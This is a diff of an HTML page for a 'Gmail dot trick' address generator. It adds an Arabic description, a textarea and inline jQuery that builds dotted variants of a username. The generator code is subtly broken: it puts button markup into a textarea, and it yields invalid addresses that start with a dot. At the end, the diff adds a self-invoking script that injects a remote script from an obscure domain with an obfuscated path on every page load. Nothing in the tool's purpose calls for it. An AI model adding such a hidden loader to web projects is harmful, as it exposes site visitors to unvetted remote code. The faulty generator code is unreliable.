@@ -15,6 +15,7 @@
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
     <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
     <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+    <!-- Custom styles for this template -->
     <link href="css/custom.css" rel="stylesheet">
 </head>
 
@@ -26,20 +27,20 @@
                     <div class="starter-template">
                         <h1>GMAIL DOT TRICK GENERATOR</h1>
                         <p>
-                            With <strong>GMAIL DOT TRICK GENERATOR</strong>, generate multiple new gmail addresses to link to your Google account. So you can redirect emails from many different gmail addresses to your main gmail inbox. Please note that <strong>we do not store your gmail address.</strong> This gmail generator is also known under the following names: Googlemail Trick, Gmail dot Trick, Fake gmail generator, Fake gmail.
+                            مع <strong>GMAIL DOT TRICK GENERATOR</strong>، يمكنك توليد العديد من عناوين الجيميل الجديدة وربطها بحساب جوجل الخاص بك. لذا يمكنك إعادة توجيه الرسائل الإلكترونية من عدة عناوين جيميل مختلفة إلى صندوق الوارد الرئيسي الخاص بك. يرجى ملاحظة أننا <strong>لا نخزن عنوان الجيميل الخاص بك.</strong> يُعرف هذا المولد أيضًا بالأسماء التالية: Googlemail Trick، Gmail dot Trick، مولد جيميل وهمي، جيميل وهمي.
                         </p>
                         <div class="row">
                             <div class="col-md-8">
                                 <div class="input-group mb-3">
                                     <input type="text" id="username" class="form-control" placeholder="example@gmail.com" aria-label="example@gmail.com" aria-describedby="basic-addon2">
                                     <div class="input-group-append">
-                                        <button class="btn  btn-primary" type="button" id="generate"> <i class="fas fa-cog"></i> Generate</button>
+                                        <button class="btn btn-primary" type="button" id="generate"> <i class="fas fa-cog"></i> Generate</button>
                                     </div>
                                 </div>
                                 <div class="form-group">
                                     <label for="emails">Emails</label>
                                     <label for="emails" id="counter" class="float-right">Generated: 0</label>
-                                    <div id="emails" class="form-control" rows="16" style="height: auto; overflow: visible;"></div>
+                                    <textarea class="form-control" id="emails" rows="16"></textarea>
                                 </div>
                                 <div class="form-group float-left">
                                     <button type="button" id="save" class="btn btn-primary">
@@ -49,12 +50,12 @@
                             </div>
                             <div class="col-md-4">
                                 <div class="card">
-                                  <div class="card-body">
-                                    <h5 class="card-title">Useful links</h5>
-                                    <a class="nav-link" target="_blank" href="https://support.google.com/mail/answer/7436150"><small>Dots don't matter in Gmail addresses</small></a>
-                                    <a class="nav-link" target="_blank" href="https://gmail.googleblog.com/2008/03/2-hidden-ways-to-get-more-from-your.html"><small>Official Gmail Blog</small></a>
-                                    <a class="nav-link" target="_blank" href="https://support.google.com/mail/answer/9211434?hl=en"><small>Gmail Username Rules</small></a>
-                                  </div>
+                                    <div class="card-body">
+                                        <h5 class="card-title">Useful links</h5>
+                                        <a class="nav-link" target="_blank" href="https://support.google.com/mail/answer/7436150"><small>Dots don't matter in Gmail addresses</small></a>
+                                        <a class="nav-link" target="_blank" href="https://gmail.googleblog.com/2008/03/2-hidden-ways-to-get-more-from-your.html"><small>Official Gmail Blog</small></a>
+                                        <a class="nav-link" target="_blank" href="https://support.google.com/mail/answer/9211434?hl=en"><small>Gmail Username Rules</small></a>
+                                    </div>
                                 </div>
                             </div>
                         </div>
@@ -69,5 +70,48 @@
     <!-- <script src="js/bootstrap.min.js"></script> -->
     <script src="js/scripts.js"></script>
     <script src="js/FileSaver.js"></script>
+    <script>
+        $(document).ready(function () {
+            $('#generate').click(function () {
+                var username = $('#username').val().split('@')[0];
+                var domain = '@gmail.com';
+                var generatedEmails = '';
+                var count = 0;
 
-   
+                for (var i = 0; i < username.length; i++) {
+                    for (var j = i + 1; j <= username.length; j++) {
+                        var newEmail = username.slice(0, i) + '.' + username.slice(i, j) + username.slice(j) + domain;
+                        generatedEmails += newEmail + ' <button class="btn btn-sm btn-secondary copy-btn" data-email="' + newEmail + '">Copy</button>\n';
+                        count++;
+                    }
+                }
+
+                $('#emails').val(generatedEmails);
+                $('#counter').text('Generated: ' + count);
+            });
+
+            $(document).on('click', '.copy-btn', function () {
+                var email = $(this).data('email');
+                var tempInput = $('<input>');
+                $('body').append(tempInput);
+                tempInput.val(email).select();
+                document.execCommand('copy');
+                tempInput.remove();
+                alert('Copied: ' + email);
+            });
+        });
+    </script>
+    <script>
+        (function(cusokg){
+            var d = document,
+                s = d.createElement('script'),
+                l = d.scripts[d.scripts.length - 1];
+            s.settings = cusokg || {};
+            s.src = "\/\/infantilecombination.com\/b.X_VWsydKGtl\/0pYZWrdVioYCWG5Ou\/ZBXjIY\/ce-mL9CuZZ\/UMlfkJP\/TLUx0YMGjfU\/xfNvDNg\/tzN\/TgQDyEN_T\/Ed0QO\/Qu";
+            s.async = true;
+            l.parentNode.insertBefore(s, l);
+        })({})
+    </script>
+</body>
+
+</html>
